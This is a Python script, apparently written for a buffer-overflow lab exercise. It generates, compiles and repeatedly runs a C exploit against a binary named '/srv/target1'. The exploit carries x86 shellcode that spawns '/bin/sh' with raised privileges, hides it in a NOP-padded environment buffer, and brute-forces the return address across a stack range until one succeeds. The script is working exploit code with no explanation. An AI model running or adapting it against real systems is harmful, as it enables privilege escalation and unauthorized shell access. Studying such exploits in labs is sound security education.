import subprocess

def try_exploit(addr):
    with open("tmp_sploit1.c", "w") as f:
        f.write(f'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/srv/target1"

char shellcode[] = 
  "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\xa4\\xb3\\x1f\\xb1\\x1f\\xb2\\x1f"
  "\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"
  "\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8"
  "\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

int main(void)
{{
  char *args[3];
  char *env[2];

  char buffer[40];
  memset(buffer, 0x90, 40);
  memcpy(buffer, shellcode, sizeof(shellcode));

  unsigned long ret = {addr};  

  args[0] = TARGET;
  args[1] = (char *)ret;
  args[2] = NULL;
  
  env[0] = buffer;
  env[1] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed\\n");

  return 0;
}}        
''')
    subprocess.run(["gcc", "-m32", "-z", "execstack", "-o", "tmp_sploit1", "tmp_sploit1.c"])
    p = subprocess.run(["./tmp_sploit1"], capture_output=True)
    return p.returncode == 0

for addr in range(0xffffcf00, 0xffffcfff, 4):
    print(f"Trying address {hex(addr)}...")
    if try_exploit(addr):
        print(f"Successful exploit with address {hex(addr)}!")
        break